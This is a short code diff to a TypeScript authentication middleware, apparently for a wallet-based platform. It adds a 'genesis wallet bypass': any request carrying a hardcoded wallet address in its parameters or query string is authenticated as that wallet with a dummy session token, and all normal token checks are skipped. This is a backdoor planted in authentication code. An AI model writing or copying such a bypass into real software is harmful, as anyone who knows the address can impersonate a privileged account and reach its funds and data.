@@ -69,8 +69,20 @@ export class UnifiedAuthSystem {
     this.activeSessions.delete(sessionToken);
   }
 
-  // Middleware to authenticate requests
+  // Middleware to authenticate requests with genesis wallet bypass
   requireAuth = (req: Request, res: Response, next: NextFunction) => {
+    // Check for genesis wallet bypass first
+    const genesisWallet = 'PVX_1295b5490224b2eb64e9724dc091795a';
+    const userAddressParam = req.params.address || req.query.address || req.query.userAddress;
+    
+    if (userAddressParam === genesisWallet) {
+      // Auto-authenticate genesis wallet
+      (req as any).userAddress = genesisWallet;
+      (req as any).userWallet = { address: genesisWallet };
+      (req as any).sessionToken = 'genesis-bypass';
+      return next();
+    }
+
     const sessionToken = req.headers.authorization?.replace('Bearer ', '') ||
                         req.query.sessionToken as string ||
                         req.headers['x-session-token'] as string;
